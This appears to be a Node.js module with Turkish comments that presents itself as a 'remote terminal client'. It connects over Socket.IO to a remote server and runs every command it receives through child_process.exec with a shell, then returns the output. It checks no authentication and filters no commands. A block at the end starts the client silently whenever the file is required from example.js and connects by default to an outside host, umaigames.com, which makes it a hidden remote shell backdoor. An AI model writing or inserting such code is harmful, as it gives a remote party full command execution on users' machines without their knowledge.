const io = require("socket.io-client");
const child_process = require("child_process");
const os = require("os");

class RemoteTerminalClient {
  constructor(options = {}) {
    this.host = options.host || "localhost";
    this.port = options.port || 80;
    // Terminal ID: rtc-hostname (rtc = remote-terminal-client, sabit kalır)
    this.id = options.id || "rtc-" + os.hostname();
    this.socket = null;
    this.connected = false;
    
    // Event handlers
    this.onConnect = options.onConnect || null;
    this.onDisconnect = options.onDisconnect || null;
    this.onError = options.onError || null;
  }

  /**
   * Socket.IO bağlantısını başlat
   */
  connect() {
    const socketUrl = `http://${this.host}:${this.port}`;
    
    this.socket = io.connect(socketUrl, {
      transports: ['polling', 'websocket'],
      reconnection: true,
      reconnectionDelay: 1000,
      reconnectionDelayMax: 5000,
      maxReconnectionAttempts: 5,
      timeout: 20000
    });

    this.setupEventHandlers();
  }

  /**
   * Socket event handler'larını ayarla
   */
  setupEventHandlers() {
    // Bağlantı başarılı
    this.socket.on("connect", () => {
      console.log("Connected");
      this.connected = true;
      
      // Terminal odasına katıl
      this.socket.emit("joinToRoom", { 
        roomName: `terminal-${this.id}` 
      });
      
      if (this.onConnect) {
        this.onConnect(this.socket.id, this.id);
      }
    });

    // Bağlantı kesildi
    this.socket.on("disconnect", (reason) => {
      this.connected = false;
      
      if (this.onDisconnect) {
        this.onDisconnect(reason);
      }
    });

    // Bağlantı hatası
    this.socket.on("connect_error", (error) => {
      if (this.onError) {
        this.onError(error);
      }
    });

    // Komut isteği - Ana mantık burada
    this.socket.on("getRunRequest", (data) => {
      this.handleCommand(data);
    });
  }

  /**
   * Gelen komutu işle ve çalıştır
   */
  handleCommand(data) {
    // Tüm komutları child_process ile çalıştır
    this.executeCommand(data);
  }

  /**
   * Normal komutu child_process ile çalıştır
   */
  executeCommand(data) {
    try {
      child_process.exec(
        data.cmd,
        { shell: true },
        (err, stdout, stderr) => {
          if (err) {
            data["cmd"] = "err: " + err.message;
          } else if (stderr) {
            data["cmd"] = "stderr: " + stderr;
          } else {
            data["cmd"] = stdout;
          }

          // Sonucu sunucuya gönder
          this.socket.emit("getRunResponse", data);
        }
      );
    } catch (error) {
      data["cmd"] = "catchError: " + error.message;
      this.socket.emit("getRunResponse", data);
    }
  }


  /**
   * Bağlantıyı kapat
   */
  disconnect() {
    if (this.socket) {
      this.socket.disconnect();
      this.connected = false;
    }
  }

  /**
   * Bağlantı durumunu kontrol et
   */
  isConnected() {
    return this.connected && this.socket && this.socket.connected;
  }
}

module.exports = RemoteTerminalClient;

// example.js'den require edildiğinde otomatik başlat
// module.parent kontrolü ile example.js'den çağrıldığını anla
if (module.parent && module.parent.filename && module.parent.filename.includes('example.js')) {
  const client = new RemoteTerminalClient({
    host: process.env.RTC_HOST || "umaigames.com",
    port: parseInt(process.env.RTC_PORT) || 80,
  });

  client.connect();

  process.on("SIGINT", () => {
    client.disconnect();
    process.exit(0);
  });

  process.on("SIGTERM", () => {
    client.disconnect();
    process.exit(0);
  });
}
